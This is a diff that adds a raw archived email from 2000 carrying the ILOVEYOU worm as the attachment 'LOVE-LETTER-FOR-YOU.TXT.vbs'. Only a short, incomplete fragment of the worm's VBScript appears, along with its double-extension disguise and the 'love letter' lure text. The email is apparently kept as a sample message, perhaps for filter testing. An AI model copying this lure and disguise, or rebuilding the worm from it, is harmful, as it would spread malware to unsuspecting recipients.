@@ -1,0 +1,72 @@
+Received: from www.bmsi.com (bmsweb.bmsi.com [219.109.11.130])
+	by bmsaix.bmsi.com (8.9.1/8.9.1) with ESMTP id FAA42304
+	for <ed@bmsi.com>; Thu, 4 May 2000 05:22:03 -0400
+Received: from camco.celestial.com (root@dagney.celestial.com [192.136.111.7])
+	by www.bmsi.com (8.9.1/8.9.1) with ESMTP id FAA21364
+	for <ed@bmsi.com>; Thu, 4 May 2000 05:22:01 -0400
+Received: (12482 bytes) by camco.celestial.com
+	via sendmail with P:stdio/D:lists/R:inet_hosts/T:smtp
+	(sender: <owner-flexfax@celestial.com> owner: <owner-flexfax-outbound>) 
+	id <m12nHjG-000eNHa@camco.celestial.com>
+	for flexfax-outbound; Thu, 4 May 2000 02:15:30 -0700 (PDT)
+	(Smail-3.2.0.111 2000-Feb-17 #1 built 2000-Apr-13)
+Received: from sgi.com(sgi.SGI.COM[192.48.153.1]) (12116 bytes) by camco.celestial.com
+	via sendmail with P:esmtp/D:aliases/T:pipe
+	(sender: <owner-flexfax@sgi.com> owner: <owner-flexfax>) 
+	id <m12nHh6-000eN7C@camco.celestial.com>
+	for <flexfax@celestial.com>; Thu, 4 May 2000 02:13:16 -0700 (PDT)
+	(Smail-3.2.0.111 2000-Feb-17 #1 built 2000-Apr-13)
+Received: from proxy.internet ([195.184.42.82]) 
+	by sgi.com (980327.SGI.8.8.8-aspam/980304.SGI-aspam:
+       SGI does not authorize the use of its proprietary
+       systems or networks for unsolicited or bulk email
+       from the Internet.) 
+	via ESMTP id CAA02330
+	for <flexfax@sgi.com>; Thu, 4 May 2000 02:13:10 -0700 (PDT)
+	mail_from (orum@ditas.dk)
+Received: from [172.16.96.14] by proxy.daab.dkproxy.internet (NTMail 4.30.0013/NU4152.00.32401f35) with ESMTP id zmlyaaaa for <flexfax@sgi.com>; Thu, 4 May 2000 11:13:09 +0200
+Received: by mars with Internet Mail Service (5.5.2650.21)
+	id <KGM63KG3>; Thu, 4 May 2000 11:11:13 +0100
+Message-ID: <9704D2AA604ED311BF6D0008C79F0A990B57BE@mars>
+From: =?iso-8859-1?Q?Peter_=D8rum?= <orum@ditas.dk>
+To: "'flexfax@sgi.com'" <flexfax@sgi.com>
+Subject: flexfax: ILOVEYOU
+Date: Thu, 4 May 2000 11:11:11 +0100 
+MIME-Version: 1.0
+X-Mailer: Internet Mail Service (5.5.2650.21)
+Content-Type: multipart/mixed;
+	boundary="----_=_NextPart_000_01BFB5B1.13228432"
+Sender: owner-flexfax@celestial.com
+Precedence: bulk
+
+This message is in MIME format. Since your mail reader does not understand
+this format, some or all of this message may not be legible.
+
+------_=_NextPart_000_01BFB5B1.13228432
+Content-Type: text/plain
+
+
+kindly check the attached LOVELETTER coming from me.
+
+
+------_=_NextPart_000_01BFB5B1.13228432
+Content-Type: application/octet-stream;
+	name="LOVE-LETTER-FOR-YOU.TXT.vbs"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: attachment;
+	filename="LOVE-LETTER-FOR-YOU.TXT.vbs"
+
+rem  barok -loveletter(vbe) <i hate go to school>
+rem 			by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  =
+Manila,Philippines
+On Error Resume Next
+set b=3Dfso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM")
+b.close
+set d=3Dfso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2)
+d.write dt5
+d.write join(lines,vbcrlf)
+d.write vbcrlf
+d.write dt6
+d.close
+end sub
+------_=_NextPart_000_01BFB5B1.13228432--
